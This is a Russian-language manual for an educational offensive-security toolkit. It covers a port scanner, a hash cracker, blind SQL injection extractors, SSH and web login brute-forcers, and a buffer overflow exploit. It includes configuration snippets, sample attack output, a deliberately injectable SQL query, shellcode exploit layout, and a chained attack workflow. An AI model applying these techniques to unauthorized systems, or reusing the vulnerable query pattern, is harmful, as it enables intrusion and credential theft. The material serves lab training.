# TCM Security Tools - Полное руководство пользователя

[English Version](MANUAL.md)

## Содержание

1. [Введение](#введение)
2. [Предварительные требования](#предварительные-требования)
3. [Руководство по установке](#руководство-по-установке)
4. [Руководство по каждому инструменту](#руководство-по-каждому-инструменту)
5. [Продвинутое использование](#продвинутое-использование)
6. [Решение проблем](#решение-проблем)
7. [Лучшие практики](#лучшие-практики)

---

## Введение

Это руководство предоставляет исчерпывающие инструкции по использованию коллекции Python-инструментов TCM Security. Каждый инструмент разработан для образовательных целей и авторизованного тестирования безопасности.

### Важное уведомление о безопасности

⚠️ **ПРЕДУПРЕЖДЕНИЕ**: Эти инструменты мощные и могут причинить вред при неправильном использовании. Всегда:
- Получайте письменное разрешение перед тестированием любой системы
- Используйте только в изолированных лабораторных средах или на системах, которыми владеете
- Следуйте местным законам и нормативным актам
- Практикуйте ответственное раскрытие информации

---

## Предварительные требования

### Системные требования

- **Операционная система**: Linux, macOS или Windows (рекомендуется WSL)
- **Python**: Версия 3.7 или выше
- **RAM**: Минимум 2GB
- **Дисковое пространство**: 500MB для инструментов и словарей

### Необходимые знания

- Базовое понимание Python
- Основы сетей (TCP/IP, порты)
- Владение командной строкой
- Понимание концепций безопасности

---

## Руководство по установке

### Шаг 1: Установка Python

#### Linux (Debian/Ubuntu)
```bash
sudo apt update
sudo apt install python3 python3-pip
```

#### macOS
```bash
brew install python3
```

#### Windows
Скачайте с [python.org](https://www.python.org/downloads/)

### Шаг 2: Клонирование репозитория

```bash
git clone https://github.com/ranas-mukminov/tcm-guided-pyprojects.git
cd tcm-guided-pyprojects
```

### Шаг 3: Установка зависимостей

```bash
# Установить все необходимые пакеты
pip3 install requests paramiko pwntools

# Или использовать файл требований
pip3 install -r requirements.txt
```

### Шаг 4: Загрузка словарей

```bash
# Словарь RockYou (для взлома хешей)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Распространённые SSH пароли
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt -O top-100.txt
```

---

## Руководство по каждому инструменту

### 1. Сканер хостов (`host_scanner.py`)

**Назначение**: Сканирование целевых хостов на наличие открытых TCP-портов

**Возможности**:
- Многопоточное сканирование (100 одновременных потоков)
- Сканирование всех 65,535 портов
- Обнаружение портов в реальном времени
- Эффективное управление ресурсами

#### Использование

```bash
python3 host_scanner.py <цель>
```

#### Примеры

**Сканирование localhost**:
```bash
python3 host_scanner.py 127.0.0.1
```

**Сканирование домена**:
```bash
python3 host_scanner.py example.com
```

#### Пример вывода

```
--------------------------------------------------
Scanning target 192.168.1.1
Time started: 2025-11-16 10:30:00.123456
--------------------------------------------------
Port 22 is open
Port 80 is open
Port 443 is open

Scan completed!
Found 3 open port(s)
Time finished: 2025-11-16 10:35:22.654321
```

#### Советы

- Сканирование занимает 5-10 минут для всех портов
- Используйте Ctrl+C для корректного прерывания
- Настройте `max_workers` в коде для более быстрого/медленного сканирования

---

### 2. Проверка надёжности пароля (`passwd-strength.py`)

**Назначение**: Валидация надёжности пароля согласно лучшим практикам безопасности

**Возможности**:
- Проверка минимальной длины (8 символов)
- Валидация uppercase/lowercase
- Требование цифр
- Валидация спецсимволов
- Обнаружение распространённых паттернов
- Обнаружение повторяющихся символов

#### Использование

```bash
python3 passwd-strength.py
```

#### Примеры

**Слабый пароль**:
```
--- Password Strength Checker ---
Enter your password: password123

✗ Password is weak!

Issues found:
  1. Password should contain at least one uppercase letter
  2. Password should contain at least one special character (!@#$%^&* etc.)
  3. Password contains a common pattern - avoid dictionary words
```

**Надёжный пароль**:
```
--- Password Strength Checker ---
Enter your password: MyP@ssw0rd!2024

✓ Password is strong!
Your password meets all security requirements.
```

#### Требования к паролю

| Требование | Описание |
|------------|----------|
| Длина | Минимум 8 символов (рекомендуется 12+) |
| Uppercase | Минимум одна A-Z |
| Lowercase | Минимум одна a-z |
| Цифры | Минимум одна 0-9 |
| Спецсимволы | Минимум один !@#$%^&*() и т.д. |
| Паттерны | Нет распространённых слов/последовательностей |
| Повторения | Нет 3+ повторяющихся символов |

---

### 3. Взломщик SHA256 хешей (`sha256_cracking.py`)

**Назначение**: Взлом SHA256 хешей методом словарной атаки

**Возможности**:
- Атака по словарю
- Индикатор прогресса
- Счётчик попыток
- Поддержка больших словарей (rockyou.txt)

#### Использование

```bash
python3 sha256_cracking.py <sha256_хеш>
```

#### Примеры

**Создание хеша для взлома**:
```bash
echo -n "password" | sha256sum
# Вывод: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

**Взлом хеша**:
```bash
python3 sha256_cracking.py 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

#### Пример вывода

```
[*] Attempting to crack: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8!

[142] 123456 == 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
[143] password == 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] Password hash found after 143 attempts! 'password' hashes to 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8!
```

#### Советы

- Убедитесь, что rockyou.txt находится в той же директории
- Хеш должен быть в нижнем регистре
- Большие словари = больше время взлома
- Используйте для CTF-задач и образовательных целей

---

### 4. Инструменты SQL-инъекций

Доступны два варианта:
- **sql_injection_exploit.py**: Базовый метод линейного поиска
- **exp_restrict_sql_injection.py**: Оптимизированный метод бинарного поиска

**Назначение**: Эксплуатация уязвимостей слепых SQL-инъекций

**Возможности**:
- Слепая SQL-инъекция на основе булевых значений
- Извлечение хешей паролей
- Перечисление пользователей
- Счётчик запросов

#### Использование

```bash
python3 sql_injection_exploit.py
# или
python3 exp_restrict_sql_injection.py
```

#### Предварительные требования

Настройте уязвимое веб-приложение:
```python
# Пример Flask приложения (vulnerable.py)
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗУЙТЕ В ПРОДАКШЕНЕ
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # ... выполнение запроса
```

#### Конфигурация

Отредактируйте цель в скрипте:
```python
target = "http://127.0.0.1:5000"  # Измените на вашу цель
needle = "Welcome Back"            # Сообщение об успехе
```

#### Пример сессии

```
> Enter a user ID to extract the password hash: 1
	[-] User 1 hash length: 64
		[!] 142 total queries!
	[-] User 1 hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
		[!] 890 total queries!
```

#### Сравнение производительности

| Метод | Запросов для 64-символьного хеша |
|-------|----------------------------------|
| Линейный поиск | ~900 запросов |
| Бинарный поиск | ~250 запросов |

---

### 5. SSH брутфорсер (`ssh_login_brute_forcing.py`)

**Назначение**: Брутфорс учётных данных SSH

**Возможности**:
- Автоматическое тестирование паролей
- Отслеживание прогресса
- Обработка ошибок
- Предупреждения об уязвимости MITM

#### ⚠️ Предупреждение о безопасности

Этот инструмент использует `AutoAddPolicy()`, который принимает любой SSH-ключ хоста без проверки. Это создаёт уязвимость Man-in-the-Middle. Используйте только в контролируемой среде.

#### Использование

```bash
python3 ssh_login_brute_forcing.py
```

#### Конфигурация

Отредактируйте учётные данные в скрипте:
```python
host = "127.0.0.1"                        # Целевой SSH-сервер
username = "notroot"                      # Имя пользователя для тестирования
password_file = "ssh-common-passwords.txt" # Словарь паролей
```

#### Пример вывода

```
[*] Starting SSH brute force attack
[*] Target: 192.168.1.100
[*] Username: admin
[*] Password list: ssh-common-passwords.txt
--------------------------------------------------
[0] Attempting password: 'admin'
[X] Invalid password
[1] Attempting password: 'password'
[X] Invalid password
[2] Attempting password: 'welcome123'
[>] Valid password found: 'welcome123'!
--------------------------------------------------
[*] Total attempts: 3
```

#### Советы

- Используйте ограничение скорости, чтобы избежать блокировки аккаунта
- Тестируйте только системы, которыми владеете
- Списки распространённых паролей доступны в SecLists
- Рассмотрите использование Hydra для продакшен-тестирования

---

### 6. Веб-логин брутфорсер (`web_login_form_brute_forcing.py`)

**Назначение**: Брутфорс HTTP POST форм входа

**Возможности**:
- Поддержка нескольких имён пользователей
- Обработка сетевых ошибок (таймауты, ошибки соединения)
- Отображение прогресса в реальном времени
- Настраиваемое обнаружение успеха

#### Использование

```bash
python3 web_login_form_brute_forcing.py
```

#### Конфигурация

```python
target = "http://127.0.0.1:5000"           # Целевой URL
usernames = ["admin", "user", "test"]      # Имена пользователей для тестирования
passwords_file = "top-100.txt"             # Словарь паролей
needle = "Welcome Back"                    # Индикатор успеха
```

#### Пример вывода

```
[*] Starting web login brute force attack
[*] Target: http://127.0.0.1:5000
[*] Password list: top-100.txt
--------------------------------------------------

[*] Testing username: admin
[X] Attempting user:password -> admin:password
	[>>>>>] Valid password 'password' found for user 'admin'!
```

#### Обработка ошибок

Инструмент обрабатывает:
- **Таймауты**: Автоматический повтор
- **Ошибки соединения**: Повтор с уведомлением
- **HTTP ошибки**: Отображение ошибки и продолжение
- **Файл не найден**: Чёткое сообщение об ошибке

---

### 7. Эксплойт переполнения буфера (`buffer_overflow.py`)

**Назначение**: Образовательная эксплуатация переполнения буфера

**Возможности**:
- Автоматическая генерация эксплойта
- Обнаружение гаджетов
- Внедрение шеллкода
- Поддержка режима отладки

#### ⚠️ Предварительные требования

- Уязвимый бинарник: `executable_stack`
- GDB с pwndbg/peda (для отладки)
- 32-битные библиотеки (для i386 бинарников)

#### Использование

```bash
python3 buffer_overflow.py
```

#### Рабочий процесс

1. **Найти смещение** (раскомментируйте секцию отладки):
```python
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
```

2. **Вычислить смещение в GDB**:
```
gdb> cyclic -l 0x61616161
140
```

3. **Обновить эксплойт**:
```python
exploit = flat([
    b"A" * 140,              # Смещение до RET
    pack(jmp_esp),           # Перезапись RET
    asm(shellcraft.sh())     # Шеллкод
])
```

4. **Запустить эксплойт**:
```bash
python3 buffer_overflow.py
```

#### Для удалённых целей

Раскомментируйте и настройте:
```python
io = remote('target.com', 9999)
```

---

## Продвинутое использование

### Комбинирование инструментов

**Пример рабочего процесса**: Аудит веб-приложения

```bash
# 1. Сканирование открытых портов
python3 host_scanner.py target.com

# 2. Если порт 80/443 открыт, попробуйте веб-брутфорс
python3 web_login_form_brute_forcing.py

# 3. Если база данных доступна, попробуйте SQL-инъекцию
python3 sql_injection_exploit.py

# 4. Извлечь хеши паролей
# (из SQL-инъекции)

# 5. Взломать хеши
python3 sha256_cracking.py <хеш>
```

### Кастомизация

#### Изменить количество потоков (host_scanner.py)

```python
# Изменить со 100 на 200 потоков
with ThreadPoolExecutor(max_workers=200) as executor:
```

#### Добавить пользовательские паттерны (passwd-strength.py)

```python
common_patterns = ['password', '12345', 'qwerty', 'admin', 'letmein', 'mycustom']
```

#### Изменить таймаут (web_login_form_brute_forcing.py)

```python
r = requests.post(target, data={...}, timeout=10)  # 10 секунд
```

---

## Решение проблем

### Распространённые проблемы

#### 1. Ошибка "Module not found"

**Проблема**: Отсутствующие зависимости

**Решение**:
```bash
pip3 install --upgrade requests paramiko pwntools
```

#### 2. "Permission denied" на Linux

**Проблема**: Скрипт не исполняемый

**Решение**:
```bash
chmod +x *.py
```

#### 3. "Connection timeout" в сетевых инструментах

**Проблема**: Брандмауэр или недоступная цель

**Решение**:
- Проверьте доступность цели: `ping target.com`
- Проверьте настройки брандмауэра
- Увеличьте значения таймаута

#### 4. Ошибка "Too many open files"

**Проблема**: Лимит файловых дескрипторов системы

**Решение**:
```bash
# Временное исправление
ulimit -n 4096

# Постоянное исправление (Linux)
sudo nano /etc/security/limits.conf
# Добавьте: * soft nofile 4096
#           * hard nofile 8192
```

#### 5. SHA256 крекер не находит хеш

**Проблема**: Формат хеша или проблема со словарём

**Решение**:
- Убедитесь, что хеш в нижнем регистре
- Проверьте, что rockyou.txt существует и читаемый
- Попробуйте сначала меньший тестовый словарь

### Режим отладки

Включить подробный вывод:
```bash
python3 -u script.py  # Небуферизованный вывод
```

---

## Лучшие практики

### Этические рекомендации

1. **Получите разрешение**: Всегда получайте письменную авторизацию
2. **Документируйте всё**: Ведите журналы тестовых действий
3. **Соблюдайте область**: Тестируйте только согласованные цели
4. **Сообщайте о находках**: Ответственно раскрывайте уязвимости
5. **Не причиняйте вред**: Избегайте нанесения ущерба или нарушений

### Технические лучшие практики

1. **Используйте ВМ**: Тестируйте в изолированных виртуальных средах
2. **Ограничение скорости**: Не перегружайте цели
3. **Логирование**: Ведите записи всех действий
4. **Очистка**: Удаляйте любые артефакты после тестирования
5. **Оставайтесь обновлёнными**: Держите инструменты и зависимости актуальными

### Правовые соображения

- **Несанкционированный доступ незаконен** в большинстве юрисдикций
- **Computer Fraud and Abuse Act (CFAA)** в США
- **Computer Misuse Act** в Великобритании
- Наказания могут включать штрафы и тюремное заключение

### Ответственное раскрытие

Если вы нашли уязвимости:
1. Задокументируйте уязвимость
2. Свяжитесь с вендором/владельцем приватно
3. Дайте им время для исправления (стандарт 90 дней)
4. Публикуйте только после доступности патча
5. Рассмотрите программы bug bounty

---

## Дополнительные ресурсы

### Обучающие материалы

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)

### Документация инструментов

- [Requests](https://docs.python-requests.org/)
- [Paramiko](http://docs.paramiko.org/)
- [Pwntools](https://docs.pwntools.com/)

### Словари

- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/tag/data)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)

---

## Поддержка

По вопросам или проблемам:
- Откройте issue на GitHub
- Проверьте существующую документацию
- Просмотрите отчёт об аудите безопасности

**Помните**: С большой силой приходит большая ответственность. Используйте эти инструменты этично и законно.
